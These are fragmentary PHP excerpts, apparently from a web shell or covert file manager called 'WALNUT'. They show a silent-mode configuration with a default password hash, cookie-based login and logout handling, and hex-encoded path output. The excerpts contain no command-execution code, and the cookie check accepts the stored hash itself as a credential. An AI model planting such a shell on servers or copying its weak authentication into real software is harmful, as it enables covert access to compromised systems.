...
$WALNUT = array(
        "SILENT_MODE" => true,
        "LOGIN_MODE" => true,
        "PASSWORD" => "$2a$12$2wzrl0pbCf7nyEBocHD0J.pz1K.hRuLKXQnVQtAXET5FW8Hw2LkY2", // default(walnut)
        "HOME" => dirname(HOME),
        "HEX" => hex2bin($hex),
);
...
{
        global $WALNUT;
        $password = $WALNUT["PASSWORD"];

        if (!isset($_COOKIE['WALNUT'])) {
                authLogin();
        }

        if (isset($_COOKIE['WALNUT'])) {
                if (getEncodedCookie("WALNUT") !== $password) {
                authLogin();
                }
        }
}
...
function authLogin()
{
    ...
    if (isset($inputPassword)) {
            if (password_verify($inputPassword, $password)) {
                    setEncodedCookie("WALNUT", $password);
            } else {
                    displayLogin();
                    die();
            }
...
if (isset($request)) {
    ...
    if (isset($_POST['path']) && isset($_POST['action'])) {
        ...
        switch ($action) {
            ...
            case 'logout':
                if (isset($_COOKIE['WALNUT'])) {
                    setcookie("WALNUT", null);
                    $response = json_encode([
                        "logout" => setcookie("WALNUT", "")
                    ]);
                }
                prints($response);
                break;
...
<body>
    ...
    <script>
        ...
        var home = "<?php echo bin2hex($WALNUT['HOME']) ?>";
